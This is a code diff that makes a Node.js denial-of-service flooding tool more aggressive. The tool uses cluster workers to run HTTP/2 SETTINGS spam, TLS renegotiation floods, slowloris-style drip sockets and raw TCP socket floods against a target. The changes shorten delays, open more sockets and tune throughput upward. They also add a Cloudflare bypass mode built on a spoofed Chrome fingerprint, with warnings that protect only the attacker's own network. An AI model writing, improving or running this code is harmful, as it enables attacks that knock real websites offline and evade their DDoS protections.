 
                     sendH2Burst();
@@ -793,7 +1120,7 @@ if (!cluster.isMaster) {
         };
 
         for (let i = 0; i < config.concurrency; i++) {
-            setTimeout(startH2Session, i * 10);
+            setTimeout(startH2Session, i * 4);
         }
     }
 
@@ -819,9 +1146,9 @@ if (!cluster.isMaster) {
                 connectionsEstablished++;
                 requestsSent++;
 
-                const initialPayload = `GET / HTTP/1.1\r\nHost: ${HOST}\r\nUser-Agent: ${profile.ua}\r\n\r\n`;
-                socket.write(initialPayload);
-                totalBytesSent += Buffer.byteLength(initialPayload);
+                const pidx = PROFILE_INDEX.get(profile) || 0;
+                socket.write(TCP_PAYLOAD_CACHE[pidx]);
+                totalBytesSent += TCP_PAYLOAD_BYTES[pidx];
 
                 socket.on('error', () => { errorsCount++; });
                 socket.on('close', () => {
@@ -834,8 +1161,8 @@ if (!cluster.isMaster) {
         };
 
         const interval = setInterval(() => {
-            for (let i = 0; i < 50; i++) openSocket();
-        }, 50);
+            for (let i = 0; i < 80; i++) openSocket();
+        }, 20);
 
         process.on('SIGTERM', () => {
             clearInterval(interval);
@@ -876,7 +1203,7 @@ if (!cluster.isMaster) {
                         socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                             if (!err) {
                                 requestsSent++;
-                                setTimeout(loop, 75);
+                                setTimeout(loop, 40);
                             }
                         });
                     } catch (_) {
@@ -897,8 +1224,8 @@ if (!cluster.isMaster) {
         };
 
         const interval = setInterval(() => {
-            for (let i = 0; i < 10; i++) createRenegotiation();
-        }, 100);
+            for (let i = 0; i < 20; i++) createRenegotiation();
+        }, 50);
 
         process.on('SIGTERM', () => {
             clearInterval(interval);
@@ -920,7 +1247,7 @@ if (!cluster.isMaster) {
                 if (err) {
                     errorsCount++;
                     activeSockets--;
-                    setTimeout(openSlowSocket, 250);
+                    setTimeout(openSlowSocket, 100);
                     return;
                 }
 
@@ -951,7 +1278,7 @@ if (!cluster.isMaster) {
                             clearInterval(drip);
                             return;
                         }
-                        socket.write(crypto.randomBytes(Math.floor(Math.random() * 4) + 1));
+                        socket.write(SLOW_DRIP_BUFS[slowDripIdx++ & (SLOW_DRIP_VARIANTS - 1)]);
                         requestsSent++;
                     }, 1000 + Math.random() * 1000);
 
@@ -964,7 +1291,7 @@ if (!cluster.isMaster) {
                         connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                         activeSockets--;
                         clearInterval(drip);
-                        setTimeout(openSlowSocket, 50);
+                        setImmediate(openSlowSocket);
                     });
                 } else {
                     socket.write(initialPayload);
@@ -975,7 +1302,7 @@ if (!cluster.isMaster) {
                             clearInterval(drip);
                             return;
                         }
-                        socket.write(`X-Keep-Alive-${crypto.randomBytes(2).toString('hex')}: ${Math.random()}\r\n`);
+                        socket.write(SLOW_KEEPALIVE_LINES[slowDripIdx++ & (SLOW_DRIP_VARIANTS - 1)]);
                         requestsSent++;
                     }, 2000 + Math.random() * 2000);
 
@@ -988,14 +1315,14 @@ if (!cluster.isMaster) {
                         connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                         activeSockets--;
                         clearInterval(drip);
-                        setTimeout(openSlowSocket, 50);
+                        setImmediate(openSlowSocket);
                     });
                 }
             });
         };
 
         for (let i = 0; i < config.concurrency; i++) {
-            setTimeout(openSlowSocket, i * 50);
+            setTimeout(openSlowSocket, i * 20);
         }
     }
 
@@ -1013,7 +1340,7 @@ if (!cluster.isMaster) {
                 if (err) {
                     errorsCount++;
                     activeSessions--;
-                    setTimeout(startH2Session, 250);
+                    setTimeout(startH2Session, 100);
                     return;
                 }
 
@@ -1021,8 +1348,8 @@ if (!cluster.isMaster) {
 
                 const client = http2.connect(config.target, {
                     createConnection: () => socket,
-                    settings: {
-                        initialWindowSize: 6291456,
+                    settings: config.bypassCf ? CF_H2_SETTINGS : {
+                        initialWindowSize: 16777215,
                         maxFrameSize: 16384,
                         maxConcurrentStreams: 2000
                     }
@@ -1063,7 +1390,7 @@ if (!cluster.isMaster) {
                             }
                         }
 
-                        setTimeout(spamSettings, 10);
+                        setImmediate(spamSettings);
                     };
 
                     spamSettings();
@@ -1072,7 +1399,7 @@ if (!cluster.isMaster) {
         };
 
         for (let i = 0; i < config.concurrency; i++) {
-            setTimeout(startH2Session, i * 10);
+            setTimeout(startH2Session, i * 4);
         }
     }
 
@@ -1093,11 +1420,17 @@ if (!cluster.isMaster) {
 if (cluster.isMaster) {
     let totalRequests = 0;
     let totalErrors = 0;
+    let totalCfBlocks = 0;
+    let totalCbTrips = 0;
     let reqPerSecond = 0;
     let mbpsSent = 0;
 
     let currentReqInSec = 0;
     let currentBytesInSec = 0;
+    let currentCfBlocksInSec = 0;
+
+    // Per-worker effective limits (after circuit breaker adjustments)
+    const workerEffective = {}; // workerID -> { concurrency, rate }
 
     // Per-worker connection snapshot map (workerID -> last reported live connections)
     const workerConnections = {};
@@ -1111,7 +1444,7 @@ if (cluster.isMaster) {
     let loopLagMs = 0;          // last measured lag (displayed on panel)
     let pidIntegral = 0;        // accumulated error (I term)
     let pidPrevError = 0;       // previous error for derivative (D term)
-    const PID_TARGET_LAG = 3;   // ms — aggressive target (was 8, now hunting harder)
+    const PID_TARGET_LAG = 2;   // ms — aggressive target (was 8, now hunting harder)
     const PID_KP = 0.12;        // proportional gain (was 0.04, 3x more aggressive)
     const PID_KI = 0.025;       // integral gain (was 0.008, 3x more aggressive)
     const PID_KD = 0.08;        // derivative gain (was 0.02, 4x more aggressive)
@@ -1126,6 +1459,30 @@ if (cluster.isMaster) {
         setTimeout(measureLag, 1000);
     };
     setTimeout(measureLag, 1000);
+
+    // ── Local Network Safety Pre-Flight ────────────────────────────────────
+    // Estimates total simultaneous outbound sockets and warns if it'll likely
+    // exhaust ephemeral ports / NAT table on a home network.
+    const totalSockets = config.concurrency * config.workers;
+    const NAT_SAFE_LIMIT = 4000;   // typical home router NAT table size
+    const EPHEMERAL_SAFE = 20000;  // Mac default ephemeral port range minus headroom
+    if (totalSockets > NAT_SAFE_LIMIT) {
+        console.warn(`\n\x1b[1;33m[!] WARNING: total sockets (${totalSockets}) exceeds typical home-router NAT table (~${NAT_SAFE_LIMIT}).\x1b[0m`);
+        console.warn(`\x1b[1;33m    Your browser may lose connectivity during the run. Consider --preset medium or lower.\x1b[0m`);
+    }
+    if (totalSockets > EPHEMERAL_SAFE) {
+        console.warn(`\n\x1b[1;31m[!] CRITICAL: total sockets (${totalSockets}) exceeds Mac's ephemeral port budget (~${EPHEMERAL_SAFE}).\x1b[0m`);
+        console.warn(`\x1b[1;31m    Raise ulimit:  ulimit -n 65536    (and run this in the SAME terminal)\x1b[0m`);
+        console.warn(`\x1b[1;31m    Or sysctl:     sudo sysctl -w net.inet.ip.portrange.first=1024\x1b[0m\n`);
+    }
+    try {
+        // Show current ulimit hint
+        const fdLimit = process.report ? (process.report.getReport().resourceLimits || {}).fileDescriptors : null;
+        if (fdLimit && fdLimit.soft && fdLimit.soft < totalSockets / config.workers * 1.5) {
+            console.warn(`\x1b[1;33m[!] Soft FD limit (${fdLimit.soft}) is tight for ${Math.ceil(totalSockets / config.workers)} sockets/worker.\x1b[0m`);
+            console.warn(`\x1b[1;33m    Run:  ulimit -n 65536    before launching for full performance.\x1b[0m\n`);
+        }
+    } catch (_) { /* report API not available — skip */ }
 
     // Spawn cluster workers
     for (let i = 0; i < config.workers; i++) {
@@ -1154,6 +1511,18 @@ if (cluster.isMaster) {
                 totalErrors += msg.errors;
                 workerConnections[worker.id] = msg.connections;
                 currentBytesInSec += msg.bytes;
+                if (msg.cfBlocks) {
+                    totalCfBlocks += msg.cfBlocks;
+                    currentCfBlocksInSec += msg.cfBlocks;
+                }
+                if (msg.cbTrips !== undefined) {
+                    // cbTrips is cumulative per-worker; take max-of-deltas approach by tracking last seen
+                    workerEffective[worker.id] = {
+                        concurrency: msg.effectiveConcurrency,
+                        rate: msg.effectiveRate,
+                        cbTrips: msg.cbTrips
+                    };
+                }
             }
         });
     });
@@ -1185,11 +1554,13 @@ if (cluster.isMaster) {
         // PID controller — only active when autoTune is on
         if (config.autoTune) {
             const error = loopLagMs - PID_TARGET_LAG;   // +ve = too slow, -ve = headroom
-            pidIntegral = Math.max(-200, Math.min(200, pidIntegral + error));
+            pidIntegral = Math.max(-500, Math.min(500, pidIntegral + error));
             const derivative = error - pidPrevError;
             pidPrevError = error;
 
-            const adjustment = (PID_KP * error) + (PID_KI * pidIntegral) + (PID_KD * derivative);
+            // Asymmetric gain: when system has headroom (error < 0), ramp UP 1.5× faster
+            const gainMul = error < 0 ? 1.5 : 1.0;
+            const adjustment = ((PID_KP * error) + (PID_KI * pidIntegral) + (PID_KD * derivative)) * gainMul;
             // Negative adjustment = lag too high, reduce rate
             // Positive adjustment = system has headroom, increase rate
             const newRate = Math.max(1, Math.round(config.rate - adjustment));
@@ -1203,6 +1574,7 @@ if (cluster.isMaster) {
 
         currentReqInSec = 0;
         currentBytesInSec = 0;
+        currentCfBlocksInSec = 0;
     }, 1000);
 
     const startTime = Date.now();
@@ -1238,6 +1610,7 @@ if (cluster.isMaster) {
  \x1b[1;36m[CONFIG]\x1b[0m
    Method      : ${config.method.toUpperCase()}
    Mode        : ${config.post ? 'HTTP POST (Randomized payloads)' : 'HTTP GET'}
+   CF Bypass   : ${config.bypassCf ? '\x1b[1;32mON (Chrome-coherent fingerprint)\x1b[0m' : '\x1b[0;37mOFF\x1b[0m'}
    Concurrency : ${config.concurrency} sockets/worker (Total: ${config.concurrency * config.workers})
    Workers     : ${config.workers} (Cluster processes)
    Rate factor : ${config.rate} req/burst
@@ -1249,9 +1622,17 @@ if (cluster.isMaster) {
    Throughput  : \x1b[1;32m${mbpsSent} Mbps\x1b[0m
    Total Sent  : \x1b[1;33m${totalRequests.toLocaleString()}\x1b[0m
    Current RPS : \x1b[1;32m${reqPerSecond.toLocaleString()} req/s\x1b[0m
-   Total Errors: \x1b[1;31m${totalErrors.toLocaleString()}\x1b[0m
+   Total Errors: \x1b[1;31m${totalErrors.toLocaleString()}\x1b[0m${config.bypassCf ? `
+   CF Blocks   : \x1b[1;${totalCfBlocks > 0 ? '31' : '32'}m${totalCfBlocks.toLocaleString()} (${currentCfBlocksInSec}/s)\x1b[0m` : ''}
    Loop Lag    : \x1b[1;${loopLagMs > 20 ? '31' : loopLagMs > 8 ? '33' : '32'}m${loopLagMs.toFixed(1)} ms\x1b[0m
    PID Δ Rate  : \x1b[1;${autoTuneDelta < 0 ? '31' : autoTuneDelta > 0 ? '32' : '37'}m${autoTuneDelta >= 0 ? '+' : ''}${autoTuneDelta} r/burst\x1b[0m
+   Circuit Brk : ${(() => {
+                const tripsSum = Object.values(workerEffective).reduce((s, w) => s + (w.cbTrips || 0), 0);
+                const effC = Object.values(workerEffective).reduce((s, w) => s + (w.concurrency || 0), 0);
+                const effR = Object.values(workerEffective).length ? Math.round(Object.values(workerEffective).reduce((s, w) => s + (w.rate || 0), 0) / Object.values(workerEffective).length) : config.rate;
+                const tripped = tripsSum > 0;
+                return `\x1b[1;${tripped ? '33' : '32'}m${tripped ? 'TRIPPED ' + tripsSum + 'x' : 'OK'}\x1b[0m  effective: ${effC || (config.concurrency * config.workers)} conns / ${effR} rate`;
+            })()}
 
  \x1b[1;36m[PROGRESS]\x1b[0m
    Elapsed Time: ${elapsed}s / ${config.duration}s ${bar} (${percentTime}%)
